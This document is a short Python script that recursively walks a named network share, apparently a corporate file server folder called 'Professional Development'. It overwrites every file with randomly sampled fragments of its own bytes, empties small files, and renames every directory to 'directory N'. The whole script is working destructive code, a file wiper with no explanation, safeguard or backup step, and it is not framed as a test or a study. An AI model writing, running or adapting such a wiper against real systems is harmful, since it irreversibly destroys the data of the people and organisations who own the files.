"""
Replace and rename all files
"""

from pathlib import Path
import os
import random

targetDir = r"\\hq3hfsvip01\autoreh\Professional Development"
allTargets = Path(targetDir).rglob("*")

def scramble(path):
    pass

directories = []
errors = []
for path in allTargets:
    if path.is_file():
        with open(path, "rb") as file:
            text = file.read()
        with open(path, "wb") as file:
            idx = len(text)
            if idx > 2:
                idx = int(idx/2)
                li = random.sample(text, len(text))[:idx]
                newText = "".join([str(el) for el in li])
                newText = bytes(newText, "utf-8")
            elif idx <= 2:
                newText = bytes("", "utf-8")
            file.write(newText)  
    elif path.is_dir():
        directories.append(path)
    else:
        errors.append(path)

it = 0
for path in directories:
    it += 1
    newDirName = f"directory {it}"
    newPath = os.path.join(path.parent, newDirName)
    path.rename(newPath)

print(errors)
